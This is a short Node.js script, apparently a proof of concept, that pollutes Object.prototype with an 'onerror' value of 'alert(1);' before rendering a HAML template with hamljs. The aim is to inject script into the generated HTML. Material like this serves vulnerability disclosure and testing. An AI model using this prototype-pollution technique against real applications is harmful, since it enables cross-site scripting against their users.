const haml = require('hamljs')
const fs = require('fs')


var options = {
    filename: 'page.haml',
    locals: {
      title: 'Welcome',
      body: 'wahoo',
      usersOnline: 15
    }
}


Object.prototype.onerror = "alert(1);"

let ret = haml.render(fs.readFileSync(__dirname+'/views/page.haml'), options)
console.log(ret)
